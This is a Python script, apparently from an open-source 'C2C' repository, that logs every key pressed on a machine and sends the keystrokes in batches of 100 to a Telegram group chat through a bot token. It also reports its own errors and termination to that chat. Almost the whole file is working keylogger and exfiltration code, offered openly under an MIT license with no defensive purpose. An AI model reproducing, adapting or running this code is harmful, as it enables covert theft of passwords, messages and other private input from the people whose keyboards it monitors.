##############################################################################
# TelegramBot_C2C_Py - keylogger_bot.py - Python Script
# Description: Act as key logger and use Telegram API bot to send the logs to the group chat 
# Author: Dor Dahan
# License: MIT (See details in the LICENSE file or at the end of this script)
##############################################################################

import keyboard
import telepot

CHAT_ID = ""
TOKEN = ""


class KeylogBot:
    def __init__(self, bot):
        self.bot = bot

    def send_message_string(self, text):
        try:
            if isinstance(text, list):
                text = ",".join(text)
            self.bot.sendMessage(chat_id=CHAT_ID, text=text)
        except Exception as error1:
            self.send_message_string(f"Error sending message: {error1}")


class KeyLog:
    def __init__(self):
        self.pressed_keys = []
        self.total = []

    def logging(self, telegram_bot):
        try:
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    key_string = self.convert_event_to_string(event)
                    if key_string:
                        self.pressed_keys.append(key_string)
                    if len(self.pressed_keys) % 100 == 0:
                        break
            self.total.append(self.pressed_keys)
            telegram_bot.send_message_string(self.pressed_keys)
            self.pressed_keys.clear()
        except Exception as error2:
            telegram_bot.send_message_string(f"Error in logging:{error2}")

    @staticmethod
    def convert_event_to_string(event):
        if isinstance(event, keyboard._keyboard_event.KeyboardEvent):
            return event.name if event.event_type == keyboard.KEY_DOWN else ''


def keylogger():
    bot = telepot.Bot(TOKEN)
    record = KeyLog()
    bot = KeylogBot(bot)
    try:
        while True:
            record.logging(bot)
    except KeyboardInterrupt:
        bot.send_message_string(f"Keylogger terminated.")
        print("Exiting...")
        exit()
    except Exception as error0:
        bot.send_message_string(f"Keylogger error: {error0}")
        exit()


if __name__ == "__main__":
    try:
        keylogger()
    except Exception as error:
        print(f"Error: {error}")
        exit(1)
        
# License Information
# This script is open-source and released under the MIT License.
# MIT License
# Copyright (c) 2023 Dor Dahan
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# For more details, see the LICENSE file in the root directory of this repository
# or visit https://github.com/D0rDa4aN919/PY_Telegram_keylogger.
